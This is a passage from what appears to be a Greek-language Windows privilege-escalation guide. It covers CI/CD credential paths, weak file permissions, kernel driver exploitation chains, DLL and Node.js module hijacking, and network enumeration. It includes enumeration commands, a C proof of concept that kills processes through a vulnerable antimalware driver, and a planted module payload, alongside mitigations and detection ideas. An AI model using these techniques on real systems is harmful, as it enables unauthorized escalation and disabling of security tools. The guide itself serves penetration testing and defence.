Σε έναν Windows Jenkins controller, διαχωρίστε το δικαίωμα δημιουργίας ή διαμόρφωσης ενός job από το δικαίωμα εκκίνησής του: [το Jenkins τα τεκμηριώνει ως ξεχωριστά δικαιώματα `Job/Create`, `Job/Configure` και `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ένα διαμορφωμένο schedule ή remote trigger μπορεί να προσφέρει άλλη διαδρομή εκτέλεσης build, αλλά επιβεβαιώστε ότι είναι ενεργοποιημένο και ότι το build εκτελείται πράγματι. Η εκτέλεση γίνεται με την ταυτότητα του controller ή του επιλεγμένου agent, ενώ ένα αποθηκευμένο credential μπορεί να χρησιμοποιηθεί μόνο αν το job έχει πρόσβαση στο πεδίο εφαρμογής του. Ελέγξτε ξεχωριστά την πρόσβαση στα metadata του `JENKINS_HOME`: το Jenkins αποθηκεύει υλικό διαπιστευτηρίων και κλειδιά κρυπτογράφησης στα `credentials.xml`, `secrets/hudson.util.Secret` και `secrets/master.key` ([αποθήκευση μυστικών του Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Η παρουσία τους από μόνη της δεν αποκαλύπτει κωδικό πρόσβασης· επαληθεύστε **την πρόσβαση ανάγνωσης στα απαιτούμενα αρχεία** και μια ξεχωριστή διαδρομή επαναχρησιμοποίησης λογαριασμού, χωρίς να εκτυπώσετε μυστικά σε κοινόχρηστη έξοδο. Αν αυτός ο λογαριασμός έχει δικαίωμα εγγραφής στο `scriptPath` ενός αντικειμένου χρήστη AD, επιβεβαιώστε ότι η διαδρομή script είναι εγγράψιμη και ότι υπάρχει πραγματική σύνδεση ή προγραμματισμένος consumer που εκτελείται ως ο χρήστης-στόχος, πριν το θεωρήσετε εκτέλεση μεταξύ χρηστών. Για έλεγχο ομάδων απαιτείται ξεχωριστή επαλήθευση των πραγματικών δικαιωμάτων AD.

#### Ταυτότητα self-hosted agent του Azure Pipelines

Για ένα έργο Azure DevOps Server ή Azure Pipelines, διαχωρίστε το δικαίωμα **δημιουργίας ή επεξεργασίας** ενός pipeline από το δικαίωμα **εκτέλεσης σε ουρά** του και χρήσης του επιλεγμένου agent pool· η [Microsoft τεκμηριώνει ξεχωριστά τα δικαιώματα pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) και την [εξουσιοδότηση pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Αν ένας λογαριασμός με χαμηλότερα δικαιώματα μπορεί να υποβάλει ένα βήμα script και να εκτελέσει αυτό το pipeline σε self-hosted Windows agent, το βήμα εκτελείται ως ο [διαμορφωμένος λογαριασμός λειτουργικού συστήματος του agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Επιβεβαιώστε το ακριβές pipeline, τους περιορισμούς branch/resource, το εξουσιοδοτημένο pool, το εκτελέσιμο job και την ταυτότητα της υπηρεσίας agent πριν ισχυριστείτε μετάβαση μεταξύ χρηστών ή σε SYSTEM. Ένας εγκατεστημένος agent, ένας ρόλος έργου ή δικαίωμα εγγραφής σε repository αποτελούν απλώς ενδείξεις προς διερεύνηση· ελέγξτε τα δικαιώματα και τα τοπικά metadata υπηρεσιών χωρίς να ξεκινήσετε build κατά την παθητική απαρίθμηση.

#### Διαπιστευτήρια του Microsoft Entra Connect Sync

Η [Microsoft διακρίνει](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) τον **λογαριασμό υπηρεσίας ADSync**, ο οποίος εκτελεί την υπηρεσία συγχρονισμού και αποκτά πρόσβαση στη βάση δεδομένων SQL της, από τον **λογαριασμό σύνδεσης AD DS**, του οποίου τα δικαιώματα καταλόγου εξαρτώνται από τις διαμορφωμένες δυνατότητες συγχρονισμού. Τα διαπιστευτήρια σύνδεσης αποθηκεύονται κρυπτογραφημένα σε αυτήν τη βάση δεδομένων, με υλικό κλειδιού [προστατευμένο μέσω DPAPI υπό τον λογαριασμό υπηρεσίας ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Μια εγκατεστημένη υπηρεσία συγχρονισμού, μια ομάδα που ακούγεται σαν να έχει δικαιώματα τοπικού διαχειριστή ή η απλή ορατότητα της βάσης δεδομένων δεν αποδεικνύουν ότι υπάρχει αποκρυπτογραφήσιμο credential ή δυνατότητα κλιμάκωσης δικαιωμάτων στον τομέα. Εξετάστε ξεχωριστά τα πραγματικά δικαιώματα ανάγνωσης στη βάση δεδομένων, την πρόσβαση στον λογαριασμό υπηρεσίας και στα κλειδιά, τη διάταξη εγκατάστασης και SQL, την ταυτότητα σύνδεσης που έχει διαμορφωθεί και τα πραγματικά δικαιώματα AD αυτής της ταυτότητας. Η συνήθης απαρίθμηση πρέπει να εμφανίζει μόνο metadata υπηρεσίας και πρόσβασης, όχι να ερωτά ή να εκτυπώνει τα αποθηκευμένα μυστικά.

#### Δικαιώματα σε DLL υποστήριξης προγραμμάτων οδήγησης εκτυπωτή

Ένα εγκατεστημένο πρόγραμμα οδήγησης εκτυπωτή μπορεί να διατηρεί DLL υποστήριξης στο `C:\ProgramData` και να τα φορτώνει σε μια διεργασία εκτύπωσης με αυξημένα δικαιώματα. Ελέγξτε τα ACL του ακριβούς καταλόγου του driver και των DLL, συμπεριλαμβανομένων των γονικών καταλόγων και των reparse points, ακόμη κι αν δεν επιτρέπεται η απαρίθμηση printer WMI. Για το [ζήτημα προγράμματος οδήγησης εκτυπωτή Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), η αναφερόμενη διαδρομή ήταν `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`· η [αρχική αποκάλυψη](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) περιγράφει τη φόρτωση DLL από το `PrintIsolationHost.exe`. Ένα ACL που επιτρέπει εγγραφή είναι απλώς ένδειξη προς διερεύνηση: επαληθεύστε την πραγματική πρόσβαση εγγραφής μετά την εφαρμογή των deny entries, ότι ο σχετικός driver είναι εγκατεστημένος και φορτώνει το αρχείο με ταυτότητα αυξημένων δικαιωμάτων, καθώς και αν ο ενημερωμένος driver ή το πρόγραμμα ασφάλειας του προμηθευτή έχει διορθώσει την εγκατάσταση. Μην συμπεραίνετε ότι υπάρχει ευπάθεια μόνο από το όνομα του καταλόγου ή την έκδοση του driver.

### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων ώστε να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από λογαριασμό Administrator (schedtasks).

Ένας τρόπος εντοπισμού αδύναμων δικαιωμάτων σε φακέλους/αρχεία του συστήματος είναι:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload για persistence/εκτέλεση

Το Notepad++ φορτώνει αυτόματα κάθε DLL plugin που βρίσκεται στους υποφακέλους `plugins`. Αν υπάρχει εγκατάσταση portable/αντίγραφο με δυνατότητα εγγραφής, η προσθήκη ενός κακόβουλου plugin παρέχει αυτόματη εκτέλεση κώδικα μέσα στο `notepad++.exe` σε κάθε εκκίνηση (και από το `DllMain` και από callbacks του plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο registry key ή binary που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **τοποθεσίες autoruns για κλιμάκωση προνομίων**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **περίεργους/ευάλωτους drivers τρίτων κατασκευαστών**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Αν ένας driver εκθέτει ένα primitive αυθαίρετης ανάγνωσης/εγγραφής στον kernel (συνηθισμένο σε κακοσχεδιασμένους IOCTL handlers), μπορείτε να κλιμακώσετε τα δικαιώματα κλέβοντας απευθείας ένα SYSTEM token από τη μνήμη του kernel.<sup>[[13]](#references)</sup> Δείτε την τεχνική βήμα προς βήμα εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Για bugs τύπου race condition, όπου η ευάλωτη κλήση ανοίγει μια διαδρομή Object Manager που ελέγχεται από τον attacker, η σκόπιμη επιβράδυνση της αναζήτησης (με components μέγιστου μήκους ή βαθιές αλυσίδες directories) μπορεί να διευρύνει το χρονικό παράθυρο από microseconds σε δεκάδες microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF σε cancel-safe queues, disclosures από paged-pool και pivots μέσω I/O ring

Ορισμένες αλυσίδες Windows kernel LPE μπορούν να δημιουργηθούν από δύο bugs που είναι αδύναμα μεμονωμένα: ένα **race κατά τη διάρκεια ζωής μιας cancel-safe queue** που αποδεσμεύει ένα request/CBD ενώ το queue lock είναι ακόμη κλειδωμένο, και ένα disclosure **αποδέσμευσης lock πριν από την αντιγραφή** που διαρρέει μια αποδεσμευμένη paged-pool allocation κατά τη διάρκεια του `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Σημειώσεις για auditing και exploitation:

- **Αποδέσμευση ενώ το lock είναι κλειδωμένο + cancel στη συνέχεια**: αναζητήστε μια διαδρομή επιτυχίας που κάνει **Acquire -> CompleteRequest/free -> Release**, ενώ η διαδρομή cancel κάνει **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Αν η διαδρομή επιτυχίας φτάσει στο `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` πριν απελευθερώσει το lock CBDQ/CSQ, ένα thread που έχει μπλοκαριστεί στο `NtCancelIoFileEx -> IopCsqCancelRoutine` μπορεί αργότερα να συνεχίσει και να περάσει ένα αποδεσμευμένο `PFLT_CALLBACK_DATA` πίσω στο callback αφαίρεσης του driver.
- **Ανακτήστε το αποδεσμευμένο queue object** με μια paged-pool allocation ίδιου μεγέθους που ελέγχεται από τον attacker. Οι εγγραφές Data Queue Entries του `NPFS` είναι χρήσιμες, επειδή το payload και το μέγεθος είναι ελεγχόμενα και μπορείτε αργότερα να τις εξετάσετε με λειτουργίες ανάγνωσης/peek pipe. Αν το αποδεσμευμένο object περιέχει list links, αντικαταστήστε τα με μια **κυκλική λίστα από fake request nodes στη user memory**, ώστε ο driver να επεξεργάζεται επανειλημμένα attacker-defined request structures αντί να τερματίζεται στην αρχική κεφαλή της λίστας.
- **Αναβαθμίστε ένα προβλέψιμο write**: αν το fake request ανακατευθύνει έναν nested context pointer που χρησιμοποιείται για bookkeeping writes (timestamps / QPC / πεδία κοντά στο refcount), μπορεί να αποκτήσετε ένα kernel write **με ελεγχόμενη διεύθυνση αλλά όχι ελεγχόμενη τιμή**. Σε αυτή την περίπτωση, στοχεύστε το πεδίο **length/size** ενός sprayed pool object αντί για έναν τελικό code/data pointer και, στη συνέχεια, απαριθμήστε το spray μέχρι το αλλοιωμένο object να επιτρέψει μια **out-of-bounds ανάγνωση από paged-pool**.
- **Μοτίβο disclosure που επιδέχεται race**: κάθε syscall που κάνει `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` είναι ισχυρός υποψήφιος. Η αξιοπιστία βελτιώνεται όταν ο attacker μπορεί να αυξήσει το μέγεθος του buffer που αντιγράφεται (για παράδειγμα, προσθέτοντας πολλές εγγραφές list/resource που αυξάνουν το τελικό μέγεθος allocation ενός serializer), επειδή η μεγαλύτερη αντιγραφή διευρύνει το χρονικό παράθυρο αντικατάστασης χωρίς να προκαλεί απαραίτητα crash στο σύστημα.
- **Στόχοι refill με πολλούς pointers**: οι registered-buffer arrays του Windows **I/O ring** είναι εξαιρετικοί στόχοι disclosure, επειδή το μέγεθος της paged-pool allocation τους ελέγχεται από τον attacker (`8 * regBufferCnt`) και κάθε στοιχείο είναι kernel pointer προς ένα `_IOP_MC_BUFFER_ENTRY`. Διαρρεύστε έναν από αυτούς τους arrays, ανακτήστε το περιβάλλον `IORING_OBJECT` και, στη συνέχεια, αλλοιώστε τα **`RegBuffers`** και **`RegBuffersCount`**, ώστε οι επόμενες λειτουργίες I/O ring να χρησιμοποιούν entries που έχει πλαστογραφήσει ο attacker και να παρέχουν αυθαίρετη ανάγνωση/εγγραφή στον kernel. Αν το μόνο διαθέσιμο write σάς δίνει ένα σταθερό byte (για παράδειγμα από το `KUSER_SHARED_DATA+0x14`), χρησιμοποιήστε **επικαλυπτόμενα, μη ευθυγραμμισμένα writes** για να δημιουργήσετε έναν επαναλαμβανόμενο user pointer, όπως `0x0101010101010101`, αντιστοιχίστε τον με `VirtualAlloc` και τοποθετήστε εκεί τον πλαστογραφημένο registered-buffer array.<sup>[[30]](#references)</sup>

Χρήσιμες ενδείξεις για debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Μόλις αποκτήσετε αυθαίρετη δυνατότητα ανάγνωσης/εγγραφής στο kernel μέσω του αλλοιωμένου I/O ring, κλέψτε ένα SYSTEM token ακολουθώντας την τυπική διαδικασία μετά την απόκτηση του primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives αλλοίωσης μνήμης registry hive

Τα σύγχρονα vulnerabilities των hive σάς επιτρέπουν να διαμορφώνετε ντετερμινιστικές διατάξεις μνήμης, να εκμεταλλεύεστε εγγράψιμους απογόνους των HKLM/HKU και να μετατρέπετε την αλλοίωση metadata σε υπερχειλίσεις του kernel paged pool, χωρίς custom driver. Μάθετε όλη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Σύγχυση τύπων direct-mode του `RtlQueryRegistryValues` μέσω paths που ελέγχονται από τον επιτιθέμενο

Ορισμένοι drivers δέχονται ένα registry path από το userland, ελέγχουν μόνο ότι είναι μια έγκυρη συμβολοσειρά UTF-16 και έπειτα καλούν `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` σε μια scalar μεταβλητή της στοίβας, όπως το `int readValue`. Αν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται με βάση τον **πραγματικό** τύπο του registry και όχι τον τύπο που περίμενε ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ένα απόλυτο path `\Registry\...` που ελέγχει ο χρήστης επιτρέπει στον driver να κάνει query σε κλειδιά που επιλέγει ο επιτιθέμενος, να διαρρεύσει την ύπαρξή τους μέσω return codes/logs και μερικές φορές να διαβάσει τιμές στις οποίες ο caller δεν θα είχε άμεση πρόσβαση.
- **Αλλοίωση μνήμης kernel**: ένας προορισμός scalar, όπως το `&readValue`, υπόκειται σε σύγχυση τύπων και αντιμετωπίζεται ως `REG_QWORD`, `UNICODE_STRING` ή buffer δυαδικών δεδομένων συγκεκριμένου μεγέθους, ανάλογα με τον τύπο της registry value.

Σημειώσεις για πρακτική εκμετάλλευση:

- **Mitigation στα Windows 8+**: αν το query στοχεύει ένα **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT`, αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι callers του kernel καταρρέουν με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να διατηρήσετε τη δυνατότητα εκμετάλλευσης, αναζητήστε **κλειδιά εγγράψιμα από τον επιτιθέμενο μέσα σε trusted system hives**, αντί να τοποθετείτε τις τιμές στο `HKCU`.
- **Staging σε trusted hive**: χρησιμοποιήστε το NtObjectManager για να εντοπίσετε εγγράψιμους απογόνους του `\Registry\Machine` και εκτελέστε ξανά τη σάρωση με ένα duplicated token **χαμηλής ακεραιότητας**, ώστε να εντοπίσετε κλειδιά στα οποία είναι δυνατή η πρόσβαση από sandboxed contexts:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: μια απευθείας εγγραφή 8 byte σε ένα `int` 4 byte αλλοιώνει γειτονικά δεδομένα της στοίβας και μπορεί να αντικαταστήσει εν μέρει έναν κοντινό δείκτη callback/συνάρτησης.
- **`REG_SZ` / `REG_EXPAND_SZ`**: η direct mode αναμένει το `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. Αν ο κώδικας φορτώσει πρώτα ένα `REG_DWORD` ελεγχόμενο από τον επιτιθέμενο σε ένα scalar της στοίβας και μετά επαναχρησιμοποιήσει το ίδιο buffer για ανάγνωση συμβολοσειράς, ο επιτιθέμενος ελέγχει τα `Length`/`MaximumLength` και επηρεάζει εν μέρει τον δείκτη `Buffer`, προκαλώντας εγγραφή στον kernel με μερικό έλεγχο.
- **`REG_BINARY`**: για μεγάλα binary δεδομένα, η direct mode αντιμετωπίζει το πρώτο `LONG` στο `EntryContext` ως μέγεθος buffer με πρόσημο. Αν μια προηγούμενη ανάγνωση `REG_DWORD` αφήσει μια **αρνητική** τιμή ελεγχόμενη από τον επιτιθέμενο στο scalar που επαναχρησιμοποιείται, το επόμενο query `REG_BINARY` αντιγράφει τα byte του επιτιθέμενου απευθείας πάνω από γειτονικές θέσεις της στοίβας, κάτι που συχνά είναι ο καθαρότερος τρόπος για πλήρη αντικατάσταση δείκτη callback.

Ισχυρό μοτίβο αναζήτησης: **ετερογενείς αναγνώσεις registry στην ίδια μεταβλητή της στοίβας χωρίς επαναρχικοποίησή της**. Κάντε grep για `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, δείκτες `EntryContext` που επαναχρησιμοποιούνται και διαδρομές κώδικα στις οποίες η πρώτη ανάγνωση registry καθορίζει αν θα γίνει δεύτερη ανάγνωση.

#### Κατάχρηση της απουσίας του FILE_DEVICE_SECURE_OPEN σε device objects (LPE + EDR kill)

Ορισμένοι υπογεγραμμένοι drivers τρίτων κατασκευαστών δημιουργούν το device object τους με ισχυρό SDDL μέσω του IoCreateDeviceSecure, αλλά παραλείπουν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτήν τη σημαία, το secure DACL δεν επιβάλλεται όταν το device ανοίγεται μέσω διαδρομής που περιέχει ένα επιπλέον component, επιτρέποντας σε οποιονδήποτε μη προνομιούχο χρήστη να αποκτήσει handle χρησιμοποιώντας μια διαδρομή namespace όπως:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματικό περιστατικό)

Μόλις ένας χρήστης μπορέσει να ανοίξει το device, μπορεί να καταχραστεί τα προνομιούχα IOCTL που εκθέτει ο driver για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή handles πλήρους πρόσβασης σε αυθαίρετες διεργασίες (κλοπή token / κέλυφος SYSTEM μέσω DuplicateTokenEx/CreateProcessAsUser).
- Απεριόριστη ανάγνωση/εγγραφή raw disk (tampering εκτός σύνδεσης, τεχνάσματα persistence κατά την εκκίνηση).
- Τερματισμός αυθαίρετων διεργασιών, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας το kill AV/EDR από userland μέσω kernel.

Ελάχιστο μοτίβο PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Μετριασμοί για developers
- Να ορίζετε πάντα το FILE_DEVICE_SECURE_OPEN κατά τη δημιουργία αντικειμένων συσκευών που προορίζονται να περιορίζονται από DACL.
- Να επαληθεύετε το πλαίσιο του καλούντος για προνομιακές λειτουργίες. Να προσθέτετε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασιών ή την επιστροφή handles.
- Να περιορίζετε τα IOCTLs (μάσκες πρόσβασης, METHOD_*, επικύρωση εισόδου) και να εξετάζετε brokered μοντέλα αντί για άμεσα προνόμια kernel.

Ιδέες ανίχνευσης για defenders
- Να παρακολουθείτε ανοίγματα ύποπτων ονομάτων συσκευών από user mode (π.χ., \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδηλώνουν κατάχρηση.
- Να επιβάλλετε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (HVCI/WDAC/Smart App Control) και να διατηρείτε τις δικές σας λίστες allow/deny.


## PATH DLL Hijacking

Αν έχετε **δικαιώματα εγγραφής σε έναν φάκελο που περιλαμβάνεται στο PATH**, ενδέχεται να μπορέσετε να κάνετε hijack ένα DLL που φορτώνεται από μια διεργασία και να **κλιμακώσετε προνόμια**.<sup>[[2]](#references)</sup>

Ελέγξτε τα δικαιώματα όλων των φακέλων που περιλαμβάνονται στο PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Για περισσότερες πληροφορίες σχετικά με το πώς να καταχραστείτε αυτόν τον έλεγχο:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Υποκλοπή επίλυσης module του Node.js / Electron μέσω `C:\node_modules`

Πρόκειται για μια παραλλαγή του **Windows uncontrolled search path** που επηρεάζει εφαρμογές **Node.js** και **Electron** όταν εκτελούν ένα bare import, όπως `require("foo")`, και το αναμενόμενο module **λείπει**.<sup>[[20]](#references)</sup>

Το Node επιλύει τα packages ανεβαίνοντας στη δενδρική δομή καταλόγων και ελέγχοντας τους φακέλους `node_modules` σε κάθε γονικό κατάλογο. Στα Windows, αυτή η αναζήτηση μπορεί να φτάσει στη ρίζα της μονάδας δίσκου, επομένως μια εφαρμογή που εκκινείται από το `C:\Users\Administrator\project\app.js` μπορεί τελικά να ελέγξει τα εξής:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **χρήστης με χαμηλά δικαιώματα** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει εκεί ένα κακόβουλο `foo.js` (ή έναν φάκελο package) και να περιμένει μέχρι μια διεργασία **Node/Electron με υψηλότερα δικαιώματα** να επιλύσει την ελλείπουσα εξάρτηση. Το payload εκτελείται στο πλαίσιο ασφαλείας της διεργασίας-θύματος, οπότε αυτό οδηγεί σε **LPE** κάθε φορά που ο στόχος εκτελείται ως administrator, μέσω μιας elevated scheduled task/service wrapper ή ως εφαρμογή επιφάνειας εργασίας με προνομιακή αυτόματη εκκίνηση.

Αυτό συμβαίνει συχνά όταν:

- μια εξάρτηση δηλώνεται στο `optionalDependencies`<sup>[[22]](#references)</sup>
- μια βιβλιοθήκη τρίτου μέρους περικλείει το `require("foo")` σε `try/catch` και συνεχίζει αν αποτύχει
- ένα package αφαιρέθηκε από τα production builds, παραλείφθηκε κατά το packaging ή απέτυχε να εγκατασταθεί
- το ευάλωτο `require()` βρίσκεται βαθιά μέσα στο δέντρο εξαρτήσεων και όχι στον κώδικα της κύριας εφαρμογής

### Εντοπισμός ευάλωτων στόχων

Χρησιμοποιήστε το **Procmon** για να επιβεβαιώσετε τη διαδρομή επίλυσης:<sup>[[23]](#references)</sup>

- Φιλτράρετε με `Process Name` = το εκτελέσιμο αρχείο-στόχος (`node.exe`, το EXE της εφαρμογής Electron ή η διεργασία wrapper)
- Φιλτράρετε με `Path` `contains` `node_modules`
- Εστιάστε στα `NAME NOT FOUND` και στο τελευταίο επιτυχές άνοιγμα κάτω από το `C:\node_modules`

Χρήσιμα μοτίβα για ανασκόπηση κώδικα σε αποσυμπιεσμένα αρχεία `.asar` ή στον πηγαίο κώδικα εφαρμογών:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Εντοπίστε το **όνομα του πακέτου που λείπει** μέσω του Procmon ή της εξέτασης του πηγαίου κώδικα.
2. Δημιουργήστε τον ριζικό κατάλογο αναζήτησης, αν δεν υπάρχει ήδη:

```powershell
mkdir C:\node_modules
```

3. Τοποθετήστε ένα module με το ακριβές αναμενόμενο όνομα:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Ενεργοποιήστε την εφαρμογή-θύμα. Αν η εφαρμογή επιχειρήσει `require("foo")` και το νόμιμο module απουσιάζει, το Node μπορεί να φορτώσει το `C:\node_modules\foo.js`.

Παραδείγματα από τον πραγματικό κόσμο για προαιρετικά modules που μπορεί να απουσιάζουν και να ταιριάζουν σε αυτό το μοτίβο είναι τα `bluebird` και `utf-8-validate`, αλλά η **τεχνική** είναι το επαναχρησιμοποιήσιμο στοιχείο: εντοπίστε οποιοδήποτε **bare import που απουσιάζει** και το οποίο θα επιλύσει μια διεργασία Node/Electron με αυξημένα δικαιώματα στα Windows.

### Ιδέες για εντοπισμό και ενίσχυση της ασφάλειας

- Ενεργοποιήστε ειδοποίηση όταν ένας χρήστης δημιουργεί το `C:\node_modules` ή γράφει εκεί νέα αρχεία/πακέτα `.js`.
- Αναζητήστε διεργασίες υψηλής ακεραιότητας που διαβάζουν από το `C:\node_modules\*`.
- Συμπεριλάβετε όλες τις εξαρτήσεις χρόνου εκτέλεσης στην παραγωγή και ελέγξτε τη χρήση του `optionalDependencies`.
- Εξετάστε τον κώδικα τρίτων για μοτίβα `try { require("...") } catch {}` που αποτυγχάνουν σιωπηρά.
- Απενεργοποιήστε τους προαιρετικούς ελέγχους, αν το υποστηρίζει η βιβλιοθήκη (για παράδειγμα, ορισμένες εγκαταστάσεις του `ws` μπορούν να παραλείψουν τον παλαιού τύπου έλεγχο `utf-8-validate` με το `WS_NO_UTF_8_VALIDATE=1`).

## Δίκτυο

### Κοινόχρηστοι πόροι

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Ελέγξτε αν υπάρχουν άλλοι γνωστοί υπολογιστές hardcoded στο αρχείο hosts

```
type C:\Windows\System32\drivers\etc\hosts
```

### Διεπαφές δικτύου & DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Ανοιχτές Θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από έξω.

```bash
netstat -ano #Opened ports?
```

Για έναν τοπικό listener, συσχέτισε το PID του με τον κάτοχο της διεργασίας, τη διαδρομή του εκτελέσιμου αρχείου και τυχόν υπηρεσία ή προγραμματισμένη εργασία που τον εκκινεί. Μια υπηρεσία απομακρυσμένου ελέγχου μπορεί να παρέχει πρόσβαση ως ο χρήστης της επιφάνειας εργασίας μόνο αν το επιτρέπουν οι έλεγχοι ταυτοποίησης και εντολών της. Μια προσαρμοσμένη εφαρμογή TCP που εκτελείται με λογαριασμό αυξημένων προνομίων αποτελεί ξεχωριστό στόχο ελέγχου: ο listener και η διαδρομή του binary είναι παθητικές ενδείξεις, ενώ η διερεύνηση μιας διαδρομής αλλοίωσης μνήμης που απαιτεί ταυτοποίηση προϋποθέτει ανάλυση του συγκεκριμένου binary και των εισόδων στις οποίες είναι προσβάσιμο. Αν μια εκτεθειμένη θύρα φαίνεται να ανήκει σε διεργασία συστήματος, σύγκρινέ τη με την εντολή [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) πριν αποδώσεις την υπηρεσία 